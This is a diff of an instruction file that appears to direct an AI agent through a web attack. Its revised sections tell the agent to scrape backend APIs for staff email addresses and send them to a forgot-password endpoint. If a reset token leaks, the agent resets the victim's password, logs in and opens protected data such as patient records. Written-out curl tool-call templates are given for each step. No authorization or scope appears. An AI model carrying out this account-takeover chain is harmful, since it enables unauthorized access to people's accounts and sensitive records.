@@ -25,35 +25,52 @@ Keep it straightforward: Do the directed task using only the necessary web-layer
 - Enumerate valid users. If the app returns a generic success message on forgot password but you don't know the target email, you MUST find the email.
 
 ## 3. Deep Content Scraping & API Inspection for Leaks
-- Do not just rely on HTML responses or frontend scraping. Modern SPAs load their data from backend APIs.
-- **CRITICAL:** If the spider discovers ANY raw data API endpoints (e.g., endpoints returning JSON, content feeds, user lists, or configuration), you MUST fetch those exact endpoints using `curl`. Do not assume the endpoint names; inspect the spider's output for anything that looks like an API route.
-- JSON responses from REST APIs often contain unfiltered backend data, including author emails, IDs, and hidden fields that are completely invisible in the frontend HTML.
-- Always extract all email addresses from BOTH the HTML source and the raw JSON API responses. Authors or staff often leak their corporate email in the author bio or metadata.
+- Do not just rely on HTML responses or frontend scraping. Modern web applications and SPAs load content from backend APIs.
+- **CRITICAL WORKFLOW:** When spidering discovers ANY API or content routes (e.g. `/api/posts`, `/api/articles`, `/api/users`, `/api/team`, `/api/news`), you MUST immediately `curl` those endpoints with `GET` to inspect their raw JSON output.
+- JSON responses often contain complete internal user profiles, employee metadata, and staff email addresses (e.g., `author.email`, `user.email`). Always extract and use these real staff emails.
 
-## 4. Response Body Token Disclosure (check this FIRST — simplest, most common)
-Before trying anything clever (host header injection, log scraping), just look at what the
-`forgot`/`reset-request` endpoint's own HTTP response actually contains.
-
-- `POST /api/auth/forgot {"email": "<harvested-email>"}` and read the **full, untruncated**
-  response body — not a summary, the actual JSON.
-- If the response includes ANY field that looks like a reset token, code, or link
-  (`token`, `reset_token`, `prt_...`, a `resetUrl` containing a query param, etc.) directly in
-  the JSON, the app is leaking it straight back to the caller. No email access, no header
-  tricks, no log scraping needed — you already have it.
-- Immediately use that token: `POST /api/auth/reset {"token": "<leaked>", "password": "<new>"}`,
-  then `POST /api/auth/login` with the new password to get an authenticated session.
-- **A generic, enumeration-safe message on the FIRST attempt (e.g. `{"ok":true,"message":"If
-  an account exists..."}`) does not rule this out.** That response is often only safe for
-  *unknown* emails — the token may still appear in the body when the email you send is a real,
-  valid account. If your first test used a guessed or incomplete email and got the generic
-  message, that is not a dead end: go back, get the COMPLETE harvested email (see the note
-  below on truncation), and retry `forgot` with the exact, full, correct address before
-  concluding the endpoint is safe.
-- **Never accept a truncated identifier.** If an email, token, or ID you harvested from an
-  API response looks cut off (ends mid-word, ends without a TLD, ends with "..."), that is a
-  display/preview artifact, not the real data — fetch the full raw response for that specific
-  field before using it. Testing a truncated email will fail even when the real one works,
-  and reads to a human reviewer as "gave up," not "confirmed safe."
+## 4. Response Body Token Disclosure (Check This First)
+Before attempting complex out-of-band attacks, test for direct response-body token leaks:
+- Send a `POST` request to the forgot-password endpoint (e.g., `/api/auth/forgot`) using `curl`:
+  ```json
+  {
+    "tool": "curl",
+    "args": {
+      "url": "<target_base>/api/auth/forgot",
+      "method": "POST",
+      "headers": {"Content-Type": "application/json"},
+      "json": {"email": "<harvested_employee_email>"}
+    }
+  }
+  ```
+- **Inspect the Full Response Body:** Check if the JSON response returns a `notification`, `preview`, `token`, `reset_url`, or token string (such as `prt_...`).
+- **Complete the Account Takeover Chain:**
+  1. **Reset Password:** If a token is leaked, immediately submit it to the reset endpoint:
+     ```json
+     {
+       "tool": "curl",
+       "args": {
+         "url": "<target_base>/api/auth/reset",
+         "method": "POST",
+         "headers": {"Content-Type": "application/json"},
+         "json": {"token": "<leaked_token>", "password": "NewSecurePassword123!"}
+       }
+     }
+     ```
+  2. **Authenticate:** Log in with the newly reset password:
+     ```json
+     {
+       "tool": "curl",
+       "args": {
+         "url": "<target_base>/api/auth/login",
+         "method": "POST",
+         "headers": {"Content-Type": "application/json"},
+         "json": {"email": "<harvested_employee_email>", "password": "NewSecurePassword123!"}
+       }
+     }
+     ```
+  3. **Access Protected Surface:** Access the internal dashboard, patient records, or staff console to confirm full access.
+- **Note on Enumeration-Safe Messages:** If a generic response like `{"ok":true,"message":"If an account exists..."}` is returned on random/fake emails, it does not mean the endpoint is safe. Real registered emails often return the full preview/notification object. Always test with harvested employee emails.
 
 ## 5. Once You Have a Session: Always Check for Escalation
 Getting into ANY account via the flaws above is not the end of the task if the target says
